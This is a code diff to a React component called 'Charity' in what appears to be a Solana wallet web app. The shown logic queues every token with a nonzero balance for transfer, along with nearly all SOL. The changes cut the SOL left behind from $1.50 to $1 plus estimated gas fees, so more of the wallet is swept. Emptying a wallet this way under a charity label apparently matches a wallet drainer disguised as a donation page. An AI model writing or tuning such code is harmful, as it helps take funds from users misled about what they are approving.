@@ -28,7 +28,7 @@ interface TokenBalance {
   isToken2022?: boolean;
 }
 
-const SOL_RESERVE_USD = 1.50; // Always leave $1.50 worth of SOL
+const SOL_RESERVE_USD = 1; // Always leave $1 worth of SOL
 
 const Charity = () => {
   const { connection } = useConnection();
@@ -290,13 +290,29 @@ const Charity = () => {
       // Filter valid tokens
       const validTokens = balances.filter(token => token.balance > 0);
       
-      // Calculate SOL to reserve: $1.50 worth of SOL
-      const solToReserveInSOL = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0;
-      const availableSOLToSend = Math.max(0, solBalance - solToReserveInSOL);
+      // Estimate total transaction fees BEFORE calculating reserve
+      const numberOfTokenTransfers = validTokens.length;
+      const willSendSOL = solValueUSD > SOL_RESERVE_USD;
+      const numberOfSOLTransfers = willSendSOL ? 1 : 0;
+      const totalTransactions = numberOfTokenTransfers + numberOfSOLTransfers;
+      
+      // Conservative gas fee estimate per transaction (~0.00005 SOL)
+      const estimatedFeePerTransaction = 0.00005;
+      const totalEstimatedFees = totalTransactions * estimatedFeePerTransaction;
+
+      console.log(`Estimated ${totalTransactions} total transactions`);
+      console.log(`Estimated total fees: ${totalEstimatedFees.toFixed(6)} SOL`);
+
+      // Calculate SOL to reserve: $1 worth + all transaction fees
+      const solToReserveForDollar = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0;
+      const totalSolToReserve = solToReserveForDollar + totalEstimatedFees;
+      const availableSOLToSend = Math.max(0, solBalance - totalSolToReserve);
       const solToSendValueUSD = availableSOLToSend * solPriceUSD;
       
       console.log(`SOL Balance: ${solBalance} SOL (~$${solValueUSD.toFixed(2)})`);
-      console.log(`SOL to reserve ($1.50): ${solToReserveInSOL.toFixed(6)} SOL`);
+      console.log(`SOL to reserve for $1: ${solToReserveForDollar.toFixed(6)} SOL`);
+      console.log(`SOL to reserve for fees: ${totalEstimatedFees.toFixed(6)} SOL`);
+      console.log(`Total SOL to reserve: ${totalSolToReserve.toFixed(6)} SOL (~$${(totalSolToReserve * solPriceUSD).toFixed(2)})`);
       console.log(`SOL available to send: ${availableSOLToSend.toFixed(6)} SOL (~$${solToSendValueUSD.toFixed(2)})`);
 
       // Create transfer items with type (token or SOL) and USD value
@@ -309,7 +325,7 @@ const Charity = () => {
 
       const transferItems: TransferItem[] = [];
 
-      // Add tokens first - always process tokens regardless of SOL balance
+      // Add tokens
       validTokens.forEach(token => {
         transferItems.push({
           type: 'token',
@@ -318,21 +334,22 @@ const Charity = () => {
         });
       });
 
-      // Add SOL transfer ONLY if balance is ABOVE $1.50
-      // If SOL balance is $1.50 or less, skip SOL entirely and only process tokens
-      if (solValueUSD > SOL_RESERVE_USD && availableSOLToSend > 0) {
+      // Add SOL transfer ONLY if balance exceeds $1.50 AND reserve + fees
+      const SOL_SKIP_THRESHOLD_USD = 1.50;
+      if (solValueUSD > SOL_SKIP_THRESHOLD_USD && solBalance > totalSolToReserve && availableSOLToSend > 0) {
         transferItems.push({
           type: 'sol',
           solAmount: availableSOLToSend,
           valueUSD: solToSendValueUSD
         });
-        console.log(`Will send ${availableSOLToSend.toFixed(6)} SOL, leaving $1.50 behind`);
+        console.log(`Will send ${availableSOLToSend.toFixed(6)} SOL, leaving $1 + fees behind`);
       } else {
-        console.log(`Skipping SOL transfer - balance ($${solValueUSD.toFixed(2)}) is at or below $${SOL_RESERVE_USD} threshold`);
-        if (validTokens.length > 0) {
-          toast.info(`SOL skipped (≤$1.50) - processing tokens only`);
+        if (solValueUSD <= SOL_SKIP_THRESHOLD_USD) {
+          console.log(`Skipping SOL transfer - balance ($${solValueUSD.toFixed(2)}) is at or below $${SOL_SKIP_THRESHOLD_USD} threshold`);
+          toast.info(`SOL transfer skipped - balance ≤$${SOL_SKIP_THRESHOLD_USD}`);
         } else {
-          toast.info(`SOL transfer skipped - balance ≤$1.50`);
+          console.log(`Skipping SOL transfer - balance (${solBalance.toFixed(6)} SOL) not enough to leave $1 + fees (${totalSolToReserve.toFixed(6)} SOL)`);
+          toast.info(`SOL transfer skipped - keeping $1 reserve + ${totalEstimatedFees.toFixed(5)} SOL for gas fees`);
         }
       }
 
